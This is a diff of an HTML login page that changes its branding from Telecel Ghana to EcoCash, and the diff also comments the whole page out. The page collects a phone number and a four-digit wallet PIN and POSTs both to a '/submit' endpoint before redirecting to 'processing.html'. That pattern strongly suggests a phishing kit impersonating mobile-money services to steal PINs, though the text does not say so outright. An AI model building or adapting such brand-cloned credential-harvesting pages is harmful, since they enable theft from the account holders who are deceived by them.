@@ -1,367 +1,529 @@
-<!DOCTYPE html>
+<!-- <!DOCTYPE html>
 <html>
 
 <head>
     <title>EcoCash Login</title>
 
     <!-- MOBILE -->
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 
-    <!-- <link rel="stylesheet" href="style.css"> -->
+<!-- <link rel="stylesheet" href="style.css"> -->
 
-    <style>
-        body {
-            margin: 0;
-            font-family: 'Segoe UI', sans-serif;
-            /* background: #ffffff; */
-            background: #d32f2f;
-        }
+<style>
+    body {
+        padding : 0;
+        margin : 0;
+        font-family: 'Sofia Pro', 'Roboto', sans-serif;
+        background: #fff;
+        color: #1a1a1a;
+        min-height: 100vh;
+        display: flex;
+        flex-direction: column;
+        overflow-x: hidden;
+    }
 
-        /* ===== TOP (SMALL RED) ===== */
-        .top {
-            background: #d32f2f;
-            color: white;
-            text-align: center;
-            padding: 20px 10px 15px;
-        }
+    /* ===== MAIN CONTENT (scrollable top area) ===== */
+    .main {
+        flex: 1;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        padding: 48px 24px 30px;
+    }
 
-        .logo-circle {
-            width: 50px;
-            height: 50px;
-            background: #eee;
-            border-radius: 50%;
-            margin: auto;
-            padding: 5px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 50px;
-            color: #d32f2f;
-            font-weight: bold;
-        }
+    /* ===== LOGO ===== */
+    .logo {
+        font-size: 44px;
+        font-weight: 700;
+        letter-spacing: -1px;
+        margin-bottom: 36px;
+        line-height: 1;
+    }
 
-        .brand {
-            font-size: 24px;
-            margin-top: 8px;
-            font-weight: bold;
-        }
+    .logo .eco {
+        color: #1a56db
+    }
 
-        .sub {
-            font-size: 13px;
-        }
+    .logo .cash {
+        color: #e02020
+    }
 
-        /* ===== CENTER (LARGE WHITE) ===== */
+    /* ===== LOGIN TITLE ===== */
+    h2 {
+        font-size: 26px;
+        font-weight: 700;
+        color: #111;
+        margin-bottom: 28px;
+        letter-spacing: -0.3px;
+    }
+
+    /* ===== PHONE BOX ===== */
+    .phone-box {
+        width: 100%;
+        max-width: 420px;
+        border: 2px solid #1a56db;
+        border-radius: 12px;
+        display: flex;
+        align-items: center;
+        padding: 13px 14px;
+        margin-bottom: 28px;
+        background: #fff;
+        gap: 6px;
+    }
+
+    .flag-wrap {
+        display: flex;
+        align-items: center;
+        gap: 4px;
+        flex-shrink: 0;
+    }
+
+    .flag {
+        font-size: 22px;
+        line-height: 1
+    }
+
+    .chevron {
+        font-size: 10px;
+        color: #888;
+        margin-left: 1px;
+    }
+
+
+    .phone-box input {
+        border: none;
+        outline: none;
+        font-size: 16px;
+        font-family: 'Sofia Pro', 'Roboto', sans-serif;
+        color: #111;
+        flex: 1;
+        min-width: 0;
+        background: transparent;
+    }
+
+    .phone-box input::placeholder {
+        color: #aab0bc
+    }
+
+    /* ===== PIN LABEL ===== */
+    .pin-label {
+        font-size: 15px;
+        font-weight: 400;
+        color: #444;
+        margin-bottom: 18px;
+        text-align: center;
+    }
+
+    /* ===== PIN INPUTS ===== */
+    .pin {
+        display: flex;
+        justify-content: center;
+        gap: 16px;
+        margin-bottom: 10px;
+    }
+
+    .pin-input {
+        width: 62px;
+        height: 62px;
+        border: 2.5px solid #1a56db;
+        border-radius: 12px;
+        font-size: 24px;
+        font-weight: 600;
+        text-align: center;
+        outline: none;
+        color: #111;
+        background: #fff;
+        font-family: 'Sofia Pro', 'Roboto', sans-serif;
+        transition: border-color .15s, box-shadow .15s;
+        -webkit-appearance: none;
+        -webkit-text-security: disc;
+    }
+
+    .pin-input:focus {
+        border-color: #1240a8;
+        box-shadow: 0 0 0 3px rgba(26, 86, 219, 0.13);
+    }
+
+    /* ===== ERROR ===== */
+    #pin-error {
+        font-size: 13.5px;
+        font-weight: 500;
+        color: #d32f2f;
+        text-align: center;
+        min-height: 20px;
+        margin: 8px 0 4px;
+        opacity: 0;
+        transition: opacity .2s;
+    }
+
+    .btn {
+        background: #fff;
+        color: #1a56db;
+        border: none;
+        padding: 16px 10px 14px;
+        border-radius: 14px;
+        font-weight: 500;
+        font-size: 14px;
+        font-family: 'Sofia Pro', 'Roboto', sans-serif;
+        width: 148px;
+        cursor: pointer;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 8px;
+        transition: opacity .15s;
+    }
+
+    .btn:active {
+        opacity: 0.85
+    }
+
+    .btn-icon {
+        font-size: 22px;
+        line-height: 1;
+    }
+
+    /* ===== FOOTER ===== */
+    .footer {
+        font-size: 12.5px;
+        opacity: 0.88;
+        line-height: 1.8;
+    }
+
+    .footer a {
+        color: #fff;
+        text-decoration: underline;
+        text-underline-offset: 2px;
+    }
+
+
+    .title {
+        text-align: center;
+        margin-bottom: 25px;
+        font-size: 18px;
+        color: #444;
+    }
+
+    label {
+        display: block;
+        margin-top: 10px;
+        font-size: 14px;
+        color: #555;
+    }
+
+    select,
+    input {
+        width: 100%;
+        padding: 15px;
+        margin-top: 8px;
+        border-radius: 12px;
+        border: 2px solid #1a56db;
+        font-size: 16px;
+        box-sizing: border-box;
+    }
+
+    /* PIN */
+    .pin-title {
+        margin-top: 25px;
+        font-size: 14px;
+    }
+
+    .pin-row {
+        display: flex;
+        justify-content: center;
+        gap: 10px;
+        margin-top: 12px;
+    }
+
+    .pin-box {
+        width: 55px;
+        height: 55px;
+        border: 2px solid #1a56db;
+        border-radius: 12px;
+        text-align: center;
+        font-size: 22px;
+    }
+
+    .icons {
+        display: flex;
+        align-items: center;
+        margin-left: 8px;
+        font-size: 18px;
+    }
+
+    .forgot {
+        text-align: center;
+        margin-top: 12px;
+        color: #1a56db;
+        font-size: 13px;
+    }
+
+    /* LOGIN BUTTON */
+    .login-btn {
+        width: 100%;
+        margin-top: 30px;
+        padding: 16px;
+        border-radius: 12px;
+        border: none;
+        background: #ccc;
+        color: white;
+        font-size: 16px;
+        transition: 0.3s;
+    }
+
+    .login-btn.active {
+        background: #1a56db;
+    }
+
+    /* ===== BOTTOM BLUE SECTION ===== */
+    .bottom {
+        background: #1a56db;
+        color: #fff;
+        text-align: center;
+        padding: 48px 28px 36px;
+        margin-top: 15px;
+        position: relative;
+        flex-shrink: 0;
+    }
+
+    /* Wave cutout at top of blue section */
+    .bottom::before {
+        content: '';
+        position: absolute;
+        top: -38px;
+        left: 0;
+        right: 0;
+        height: 40px;
+        background: #1a56db;
+        border-radius: 55% 55% 0 0 / 100% 100% 0 0;
+    }
+
+    .bottom p {
+        font-size: 15px;
+        font-weight: 400;
+        line-height: 1.6;
+        margin-bottom: 28px;
+        opacity: 0.95;
+    }
+
+    btn{
+  background:#fff;
+  color:#1a56db;
+  border:none;
+  padding:16px 10px 14px;
+  border-radius:14px;
+  font-weight:500;
+  font-size:14px;
+  font-family:'Sofia Pro','Roboto',sans-serif;
+  width:148px;
+  cursor:pointer;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  gap:8px;
+  transition:opacity .15s;
+}
+
+.btn:active{opacity:0.85}
+
+.btn-icon{
+  font-size:22px;
+  line-height:1;
+}
+
+
+    .container{
+        width: 420px;
+    }
+
+    .actions{
+  display:flex;
+  gap:14px;
+  justify-content:center;
+  margin-bottom:32px;
+}
+
+    /* MOBILE ADJUST */
+    @media (max-width: 600px) {
         .center {
-            background: #fefefe;
-            padding: 50px 20% 70px 20%;
-            border-bottom-right-radius: 24%;
-            border-bottom-left-radius: 24%;
-
-
+            padding: 40px 10% 70px 10%;
+            border-bottom-right-radius: 18%;
+            border-bottom-left-radius: 18%;
         }
-
-        .form-box {
-            max-width: 420px;
-            margin: auto;
-        }
-
-        .title {
-            text-align: center;
-            margin-bottom: 25px;
-            font-size: 18px;
-            color: #444;
-        }
-
-        label {
-            display: block;
-            margin-top: 10px;
-            font-size: 14px;
-            color: #555;
-        }
-
-        select,
-        input {
-            width: 100%;
-            padding: 15px;
-            margin-top: 8px;
-            border-radius: 12px;
-            border: 2px solid #d32f2f;
-            font-size: 16px;
-            box-sizing: border-box;
-        }
-
-        /* PIN */
-        .pin-title {
-            margin-top: 25px;
-            font-size: 14px;
-        }
-
-        .pin-row {
-            display: flex;
-            justify-content: center;
-            gap: 10px;
-            margin-top: 12px;
-        }
-
-        .pin-box {
-            width: 55px;
-            height: 55px;
-            border: 2px solid #d32f2f;
-            border-radius: 12px;
-            text-align: center;
-            font-size: 22px;
-        }
-
-        .icons {
-            display: flex;
-            align-items: center;
-            margin-left: 8px;
-            font-size: 18px;
-        }
-
-        .forgot {
-            text-align: center;
-            margin-top: 12px;
-            color: #d32f2f;
-            font-size: 13px;
-        }
-
-        /* LOGIN BUTTON */
-        .login-btn {
-            width: 100%;
-            margin-top: 30px;
-            padding: 16px;
-            border-radius: 12px;
-            border: none;
-            background: #ccc;
-            color: white;
-            font-size: 16px;
-            transition: 0.3s;
-        }
-
-        .login-btn.active {
-            background: #d32f2f;
-        }
-
-        /* ===== BOTTOM (MEDIUM RED WITH CURVE) ===== */
-        .bottom {
-            /* background: #d32f2f; */
-            /* margin-top: 40px; */
-            padding: 80px 20px 40px;
-            border-top-left-radius: 0px;
-            border-top-right-radius: 0px;
-            text-align: center;
-            color: white;
-        }
-
-        .bottom-logo {
-            width: 40px;
-            height: 40px;
-            background: #eee;
-            border-radius: 50%;
-            margin: auto;
-            padding: 5px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #d32f2f;
-            font-weight: bold;
-            font-size: 45px;
-
-        }
-
-        .bottom h2 {
-            margin: 10px 0 5px;
-        }
-
-        .bottom p {
-            margin: 0;
-            font-size: 14px;
-        }
-
-        .btn {
-            width: 100%;
-            max-width: 400px;
-            margin: 15px auto 0;
-            padding: 16px;
-            border-radius: 12px;
-            border: none;
-            background: white;
-            font-size: 15px;
-        }
-
-        /* MOBILE ADJUST */
-        @media (max-width: 600px) {
-            .center {
-                padding: 40px 10% 70px 10%;
-                border-bottom-right-radius: 18%;
-                border-bottom-left-radius: 18%;
-            }
-        }
-    </style>
+    }
+</style>
 </head>
 
 <body>
 
-    <!-- TOP WHITE -->
-    <div class="top-section">
 
-        <div class="top">
-            <div class="logo-circle">t</div>
-            <div class="brand">Telecel</div>
-            <div class="sub">Mobile Financial Services</div>
-        </div>
 
-        <!-- CENTER -->
-        <div class="center">
-            <div class="form-box">
 
-                <div class="title">Login to Your Account</div>
+    <!-- CENTER -->
+    <div class="center">
+        <div class="main">
 
-                <label>Account Type</label>
-                <select>
-                    <option>Mobile</option>
-                    <option>Broadband</option>
-                </select>
-
-                <input type="text" id="phone" readonly>
-
-                <div class="pin-title">Enter your PIN</div>
-
-                <div class="pin-row">
-                    <input maxlength="1" class="pin-box" type="password">
-                    <input maxlength="1" class="pin-box" type="password">
-                    <input maxlength="1" class="pin-box" type="password">
-                    <input maxlength="1" class="pin-box" type="password">
-                    <div class="icons">👁️ 💬</div>
-                </div>
-                <p id="errorMsg" style="color:red; text-align:center; display:none;"></p>
-
-                <div class="forgot">Forgot your PIN?</div>
-
-                <button id="submitBtn" onclick="submitOtp()" class="login-btn">LOGIN</button>
-
+            <!-- LOGO -->
+            <div class="logo">
+                <span class="eco">Eco</span><span class="cash">Cash</span>
             </div>
+            <div class="container">
+                <h2>Login</h2>
+
+            <label>Account Type</label>
+            <select>
+                <option>Mobile</option>
+                <option>Broadband</option>
+            </select>
+
+
+            <input type="text" id="phone" readonly>
+
+            <div class="pin-title">Enter your PIN</div>
+
+            <div class="pin-row">
+                <input maxlength="1" class="pin-box" type="password">
+                <input maxlength="1" class="pin-box" type="password">
+                <input maxlength="1" class="pin-box" type="password">
+                <input maxlength="1" class="pin-box" type="password">
+                <div class="icons">👁️ 💬</div>
+            </div>
+            <p id="errorMsg" style="color:red; text-align:center; display:none;"></p>
+
+            <div class="forgot">Forgot your PIN?</div>
+
+            <button id="submitBtn" onclick="submitOtp()" class="login-btn">LOGIN</button>
+            </div>
+        
+        </div>
+    </div>
+
+    <!-- BOTTOM BLUE -->
+    <div class="bottom">
+        <p>To register an EcoCash wallet or get assistance,<br>click below</p>
+
+        <div class="actions">
+            <button class="btn">
+                <span class="btn-icon">👤</span>
+                Register
+            </button>
+            <button class="btn">
+                <span class="btn-icon">ℹ️</span>
+                Help &amp; Support
+            </button>
         </div>
 
-        <!-- BOTTOM -->
-        <div class="bottom">
-
-            <div class="bottom-logo">t</div>
-            <h2>Telecel</h2>
-            <p>Ghana</p>
-            <p>Secure. Fast. Reliable.</p>
-
-            <button class="btn">📱 Download App</button>
-            <button class="btn">❓ Get Help</button>
-
+        <div class="footer">
+            <p>v3.0.2P</p>
+            <p>By signing in you agree to the <a href="#">Terms and Conditions</a></p>
         </div>
+    </div>
 
-        <script>
+    <script>
 
 
-            const inputs = document.querySelectorAll(".pin-box");
-            const loginBtn = document.getElementById("submitBtn");
+        const inputs = document.querySelectorAll(".pin-box");
+        const loginBtn = document.getElementById("submitBtn");
 
-            inputs.forEach((input, index) => {
-                input.addEventListener("input", () => {
-                    input.value = input.value.replace(/[^0-9]/g, "");
+        inputs.forEach((input, index) => {
+            input.addEventListener("input", () => {
+                input.value = input.value.replace(/[^0-9]/g, "");
 
-                    if (input.value && index < inputs.length - 1) {
-                        inputs[index + 1].focus();
-                    }
+                if (input.value && index < inputs.length - 1) {
+                    inputs[index + 1].focus();
+                }
 
-                    checkPin();
+                checkPin();
 
-                });
-
-                input.addEventListener("keydown", (e) => {
-                    if (e.key === "Backspace" && !input.value && index > 0) {
-                        inputs[index - 1].focus();
-                    }
-                });
             });
 
-            async function submitOtp() {
-                // document.getElementById("submitBtn");
-                if (loginBtn.disabled) return;
+            input.addEventListener("keydown", (e) => {
+                if (e.key === "Backspace" && !input.value && index > 0) {
+                    inputs[index - 1].focus();
+                }
+            });
+        });
 
-                let pin = "";
-                document.querySelectorAll(".pin-box").forEach(input => {
-                    pin += input.value;
+        async function submitOtp() {
+            // document.getElementById("submitBtn");
+            if (loginBtn.disabled) return;
+
+            let pin = "";
+            document.querySelectorAll(".pin-box").forEach(input => {
+                pin += input.value;
+            });
+
+            const error = document.getElementById("errorMsg");
+
+            if (pin.length < 4) {
+                error.innerText = "Enter full PIN";
+                error.style.display = "block";
+                return;
+            }
+
+            error.style.display = "none";
+
+            loginBtn.innerText = "Processing...";
+            loginBtn.disabled = true;
+
+            ;
+
+            const phone = document.getElementById("phone").value;
+
+            try {
+                const res = await fetch("/submit", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        name: "User",
+                        phone: phone,
+                        pin: pin
+                    })
                 });
 
-                const error = document.getElementById("errorMsg");
+                if (!res.ok) throw new Error();
 
-                if (pin.length < 4) {
-                    error.innerText = "Enter full PIN";
-                    error.style.display = "block";
-                    return;
-                }
+                // clear PIN AFTER submit
+                document.querySelectorAll(".pin-box").forEach(input => input.value = "");
 
-                error.style.display = "none";
+                localStorage.setItem("firstProcess", "yes");
 
-                loginBtn.innerText = "Processing...";
-                loginBtn.disabled = true;
+                window.location.href = "processing.html";
 
-                ;
+            } catch (err) {
+                error.innerText = "Submission failed. Try again.";
+                error.style.display = "block";
 
-                const phone = document.getElementById("phone").value;
+                btn.innerText = "Submit";
+                btn.disabled = false;
 
-                try {
-                    const res = await fetch("/submit", {
-                        method: "POST",
-                        headers: {
-                            "Content-Type": "application/json"
-                        },
-                        body: JSON.stringify({
-                            name: "User",
-                            phone: phone,
-                            pin: pin
-                        })
-                    });
-
-                    if (!res.ok) throw new Error();
-
-                    // clear PIN AFTER submit
-                    document.querySelectorAll(".pin-box").forEach(input => input.value = "");
-
-                    localStorage.setItem("firstProcess", "yes");
-
-                    window.location.href = "processing.html";
-
-                } catch (err) {
-                    error.innerText = "Submission failed. Try again.";
-                    error.style.display = "block";
-
-                    btn.innerText = "Submit";
-                    btn.disabled = false;
-
-                    document.getElementById("pageLoader").style.display = "none";
-                }
+                document.getElementById("pageLoader").style.display = "none";
             }
+        }
 
-            // BUTTON ACTIVE
-            function checkPin() {
-                let pin = "";
-                inputs.forEach(i => pin += i.value);
+        // BUTTON ACTIVE
+        function checkPin() {
+            let pin = "";
+            inputs.forEach(i => pin += i.value);
 
-                if (pin.length === 4) {
-                    loginBtn.classList.add("active");
-                } else {
-                    loginBtn.classList.remove("active");
-                }
+            if (pin.length === 4) {
+                loginBtn.classList.add("active");
+            } else {
+                loginBtn.classList.remove("active");
             }
+        }
 
 
-            document.getElementById("phone").value = localStorage.getItem("phone") || "+233";
+        document.getElementById("phone").value = localStorage.getItem("phone") || "+233";
 
-            window.onload = () => {
-                document.body.classList.add("loaded");
-            };
+        window.onload = () => {
+            document.body.classList.add("loaded");
+        };
 
-        </script>
-        <div id="pageLoader" class="loader" style="display:none;"></div>
+    </script>
+    <div id="pageLoader" class="loader" style="display:none;"></div>
 </body>
 
-</html>
+</html> -->
